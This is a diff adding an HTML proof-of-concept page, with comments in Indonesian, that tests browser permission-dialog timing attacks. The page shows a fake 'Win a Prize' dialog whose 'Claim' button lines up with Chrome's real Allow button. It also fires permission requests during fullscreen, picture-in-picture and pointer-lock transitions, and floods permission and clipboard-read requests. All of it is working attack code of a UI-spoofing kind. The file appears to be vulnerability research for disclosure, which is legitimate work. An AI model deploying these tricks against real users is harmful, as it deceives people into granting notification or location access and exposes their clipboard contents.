@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Permission Spoof PoC</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: Arial, sans-serif; }
+
+.overlay {
+  display: none;
+  position: fixed;
+  top: 0; left: 0;
+  width: 100%; height: 100%;
+  background: rgba(0,0,0,0.5);
+  z-index: 9998;
+}
+
+.fake-dialog {
+  position: fixed;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  background: white;
+  border-radius: 16px;
+  padding: 24px;
+  width: 300px;
+  box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+  z-index: 9999;
+  display: none;
+}
+
+.fake-dialog h3 { margin-bottom: 12px; font-size: 16px; }
+.fake-dialog p { color: #666; font-size: 14px; margin-bottom: 20px; }
+
+.btn-row { display: flex; justify-content: flex-end; gap: 12px; }
+.btn-allow {
+  background: #1a73e8; color: white;
+  border: none; padding: 10px 24px;
+  border-radius: 20px; font-size: 14px;
+}
+.btn-deny {
+  background: transparent; color: #1a73e8;
+  border: none; padding: 10px 24px;
+  font-size: 14px;
+}
+</style>
+</head>
+<body>
+
+<div style="padding:20px;">
+  <h2>Bug 3: Permission Dialog Timing Attack</h2>
+  
+  <button onclick="test1()" style="padding:15px;font-size:16px;margin:5px;">
+    Test 1: Notification + Fake Dialog
+  </button><br>
+  
+  <button onclick="test2()" style="padding:15px;font-size:16px;margin:5px;">
+    Test 2: Fullscreen → Permission
+  </button><br>
+  
+  <button onclick="test3()" style="padding:15px;font-size:16px;margin:5px;">
+    Test 3: PiP + Permission overlap
+  </button><br>
+  
+  <button onclick="test4()" style="padding:15px;font-size:16px;margin:5px;">
+    Test 4: Rapid permission requests
+  </button><br>
+  
+  <button onclick="test5()" style="padding:15px;font-size:16px;margin:5px;">
+    Test 5: Pointer lock → Permission chain
+  </button>
+  
+  <div id="result" style="margin-top:20px;font-family:monospace;font-size:13px;"></div>
+</div>
+
+<div class="overlay" id="overlay"></div>
+<div class="fake-dialog" id="fakeDialog">
+  <h3>Win a Prize! 🎉</h3>
+  <p>Tap "Claim" to receive your reward</p>
+  <div class="btn-row">
+    <button class="btn-deny">Cancel</button>
+    <button class="btn-allow" id="fakeAllow">Claim</button>
+  </div>
+</div>
+
+<script>
+function log(msg) {
+  document.getElementById('result').innerHTML += 
+    new Date().toISOString().substr(11,12) + ' ' + msg + '<br>';
+}
+
+// Test 1: Tampilkan fake dialog, lalu trigger real permission
+// Posisikan tombol "Claim" di posisi yang sama dengan "Allow"
+function test1() {
+  log('Test 1: Notification timing attack');
+  
+  // Tampilkan fake dialog dulu
+  document.getElementById('overlay').style.display = 'block';
+  document.getElementById('fakeDialog').style.display = 'block';
+  
+  // Ketika user tap "Claim", ganti dengan real permission request
+  document.getElementById('fakeAllow').onclick = function() {
+    // Sembunyikan fake dialog
+    document.getElementById('overlay').style.display = 'none';
+    document.getElementById('fakeDialog').style.display = 'none';
+    
+    // LANGSUNG trigger real notification permission
+    // Dialog asli Chrome akan muncul di posisi yang mirip
+    Notification.requestPermission().then(function(result) {
+      log('Notification permission: ' + result);
+      if (result === 'granted') {
+        log('🔴 GRANTED! User mungkin tap tanpa sadar');
+        new Notification('Test', { body: 'Permission granted via timing attack' });
+      }
+    });
+  };
+  
+  log('Fake dialog shown. Tap "Claim" to trigger real permission.');
+}
+
+// Test 2: Enter fullscreen → immediately request permission
+// Saat exit fullscreen transition, permission dialog mungkin
+// muncul di posisi yang membingungkan
+function test2() {
+  log('Test 2: Fullscreen → Permission');
+  
+  document.documentElement.requestFullscreen().then(() => {
+    log('Fullscreen entered');
+    
+    // Request permission saat masih fullscreen
+    // Browser harus menampilkan di atas fullscreen content
+    setTimeout(() => {
+      Notification.requestPermission().then(result => {
+        log('Permission result (in fullscreen): ' + result);
+      });
+      
+      // Juga request geolocation
+      navigator.geolocation.getCurrentPosition(
+        pos => log('Geolocation granted: ' + pos.coords.latitude),
+        err => log('Geolocation denied: ' + err.message)
+      );
+    }, 500);
+    
+    // Exit fullscreen setelah permission muncul
+    setTimeout(() => {
+      document.exitFullscreen();
+      log('Fullscreen exited - dialog mungkin reposition');
+    }, 1500);
+    
+  }).catch(e => log('Fullscreen failed: ' + e.message));
+}
+
+// Test 3: Buat video PiP, lalu request permission
+// PiP window bisa overlap dengan permission dialog
+function test3() {
+  log('Test 3: PiP + Permission overlap');
+  
+  // Buat video element
+  var video = document.createElement('video');
+  video.src = 'data:video/mp4;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDE=';
+  video.muted = true;
+  video.autoplay = true;
+  video.style.width = '200px';
+  document.body.appendChild(video);
+  
+  video.play().then(() => {
+    // Enter PiP
+    video.requestPictureInPicture().then(pipWindow => {
+      log('PiP entered: ' + pipWindow.width + 'x' + pipWindow.height);
+      
+      // Request permission saat PiP aktif
+      setTimeout(() => {
+        Notification.requestPermission().then(result => {
+          log('Permission during PiP: ' + result);
+        });
+      }, 500);
+      
+    }).catch(e => log('PiP failed: ' + e.message));
+  }).catch(e => log('Video play failed (expected with dummy): ' + e.message));
+  
+  log('Cek: apakah PiP window overlap dengan permission dialog?');
+}
+
+// Test 4: Rapid permission requests
+// Flood Chrome dengan multiple permission requests
+// Beberapa mungkin auto-grant atau UI confusion
+function test4() {
+  log('Test 4: Rapid permission flood');
+  
+  // Request banyak permission sekaligus
+  var permissions = [];
+  
+  permissions.push(
+    Notification.requestPermission()
+    .then(r => log('Notification: ' + r))
+  );
+  
+  permissions.push(
+    navigator.permissions.query({name: 'camera'})
+    .then(r => log('Camera state: ' + r.state))
+  );
+  
+  permissions.push(
+    navigator.permissions.query({name: 'microphone'})
+    .then(r => log('Mic state: ' + r.state))
+  );
+  
+  permissions.push(
+    navigator.permissions.query({name: 'geolocation'})
+    .then(r => log('Geo state: ' + r.state))
+  );
+  
+  // Juga request clipboard
+  permissions.push(
+    navigator.clipboard.readText()
+    .then(t => log('🔴 Clipboard READ: ' + t.substr(0, 50)))
+    .catch(e => log('Clipboard blocked: ' + e.message))
+  );
+  
+  Promise.allSettled(permissions).then(() => {
+    log('All permission requests completed');
+    log('Cek: berapa dialog yang muncul? Ada yang di-skip?');
+  });
+}
+
+// Test 5: Pointer lock → quick escape → permission request
+// Exploit the 1250ms cooldown window
+function test5() {
+  log('Test 5: Pointer lock → Permission chain');
+  log('Tap area di bawah untuk lock pointer, lalu ESC, lalu permission muncul');
+  
+  var area = document.createElement('div');
+  area.style.cssText = 'width:100%;height:200px;background:#e0e0e0;' +
+    'display:flex;align-items:center;justify-content:center;' +
+    'margin-top:20px;font-size:18px;cursor:pointer;';
+  area.textContent = 'TAP UNTUK POINTER LOCK';
+  document.body.appendChild(area);
+  
+  area.onclick = function() {
+    area.requestPointerLock();
+  };
+  
+  document.addEventListener('pointerlockchange', function() {
+    if (document.pointerLockElement) {
+      log('Pointer locked');
+      
+      // User akan ESC untuk keluar
+      // Setelah ESC, LANGSUNG request permission
+      // Apakah dialog muncul saat user masih recovery dari pointer lock?
+    } else {
+      log('Pointer unlocked - requesting permission in 100ms...');
+      
+      // Request permission segera setelah escape
+      // User baru saja menekan tombol/gesture escape
+      // Mungkin masih dalam momentum "tap"
+      setTimeout(() => {
+        Notification.requestPermission().then(result => {
+          log('Permission after pointer lock escape: ' + result);
+          if (result === 'granted') {
+            log('🔴 GRANTED! Possible confusion with escape gesture');
+          }
+        });
+      }, 100);
+    }
+  });
+}
+</script>
+</body>
+</html>
